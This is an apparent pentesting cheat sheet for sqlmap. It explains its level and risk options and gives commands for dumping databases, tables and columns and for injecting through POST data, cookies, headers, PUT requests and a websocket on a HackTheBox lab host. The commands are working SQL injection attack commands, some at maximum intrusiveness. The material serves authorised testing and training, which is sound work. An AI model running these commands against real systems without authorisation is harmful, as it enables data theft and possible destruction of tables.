---
icon: sword
---

# SQLmap

{% hint style="info" %}
### <mark style="color:purple;">Operators</mark>

<mark style="color:orange;">**`--batch`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">Non interactive mode.</mark>

<mark style="color:orange;">**`--dbms`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">Type of db being use (Ex.</mark> <mark style="color:orange;">**`mysql`**</mark><mark style="color:purple;">)</mark>

<mark style="color:orange;">**`--threads`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">Goes from</mark> <mark style="color:orange;">**`1`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`10`**</mark><mark style="color:purple;">.</mark>

***

### <mark style="color:purple;">Data</mark>

* <mark style="color:purple;">To retrieve everything:</mark>

```sh
--all --dump
```

<mark style="color:orange;">**`--dbs`**</mark> <mark style="color:purple;">-> List all the databases.</mark>

* <mark style="color:purple;">To look at the</mark> <mark style="color:orange;">**`tables`**</mark> <mark style="color:purple;">of a specific database:</mark>

```sh
-D database --tables
```

* &#x20;<mark style="color:purple;">Repeat the same process for</mark> <mark style="color:orange;">**`columns`**</mark><mark style="color:purple;">:</mark>

```sh
-D database -T table --columns
```

* <mark style="color:purple;">For</mark> <mark style="color:orange;">**`dumping`**</mark> <mark style="color:purple;">the data:</mark>

```sh
-D database -T table --dump
```

* <mark style="color:purple;">Or dump just one column:</mark>

```sh
-D database -T table -C column --dump
```

***

### <mark style="color:orange;">**`--level`**</mark>

<mark style="color:purple;">This option sets the</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**level**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">of tests, with values ranging from</mark> <mark style="color:orange;">**`1`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`5`**</mark> <mark style="color:purple;">(the default is level 1).</mark>

* <mark style="color:orange;">**`Level 1`**</mark><mark style="color:purple;">: Basic tests, only the most common and least intrusive SQL injection tests are performed.</mark>
* <mark style="color:orange;">**`Level 2-4`**</mark><mark style="color:purple;">: These levels increase the range and types of tests performed, with more advanced and varied testing.</mark>
* <mark style="color:orange;">**`Level 5`**</mark><mark style="color:purple;">: Perform the most comprehensive set of tests, including advanced and highly invasive tests. It increases the risk of being detected or causing issues on the target system.</mark>

***

### <mark style="color:orange;">`--risk`</mark>

<mark style="color:purple;">This option sets the</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**risk**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">level of tests, with values ranging from</mark> <mark style="color:orange;">**`1`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`3`**</mark> <mark style="color:purple;">(the default is 1).</mark>

* <mark style="color:orange;">**`Risk 1`**</mark><mark style="color:purple;">: Basic, low-risk tests that are less likely to cause harm or be detected.</mark>
* <mark style="color:orange;">**`Risk 2`**</mark><mark style="color:purple;">: Performs potentially more intrusive or advanced techniques.</mark>
* <mark style="color:orange;">**`Risk 3`**</mark><mark style="color:purple;">: Attempt</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**high-risk tests**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">that could be more aggressive, such as testing for blind injections, time-based techniques, or dropping and modifying tables.</mark>


{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`HTTP`</mark>

* <mark style="color:purple;">When working with HTTP request is good practice to directly save the request in to a file and use the</mark> <mark style="color:orange;">**`-r`**</mark> <mark style="color:purple;">option</mark>

{% code overflow="wrap" %}
```sh
sqlmap -r request.txt --level 5 --risk 3 --dump-all --batch
```
{% endcode %}

* <mark style="color:purple;">Use</mark> <mark style="color:orange;">**`--force-ssl`**</mark> <mark style="color:purple;">when working with</mark> <mark style="color:orange;">**`HTTPS`**</mark><mark style="color:purple;">.</mark>

{% code title="Initiates the injection test" %}
```sh
sqlmap -r login.request --force-ssl --batch
```
{% endcode %}

***

* <mark style="color:purple;">When working with</mark> <mark style="color:orange;">**`POST`**</mark> <mark style="color:purple;">requests you need to use the option</mark> <mark style="color:orange;">**`--data`**</mark><mark style="color:purple;">**:**</mark>

```sh
sqlmap -u "http://example.com" --data "username=*&password=*"
```

***

* For cookies:

```sh
sqlmap  -u "http://example.com" --cookie "cookie=INJECTION"
```

***

### <mark style="color:purple;">Headers</mark>

```sh
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
```

```sh
sqlmap -u "http://example.com" --headers="referer:*"
```

***

### <mark style="color:purple;">Methods</mark>

{% code title="PUT" %}
```sh
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Websockets</mark>

* <mark style="color:purple;">Install the python</mark> <mark style="color:orange;">**`websocket-client`**</mark> <mark style="color:purple;">module.</mark>
* <mark style="color:purple;">Indicate the</mark> <mark style="color:orange;">**`port`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`data`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```sh
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
```
{% endcode %}
{% endhint %}
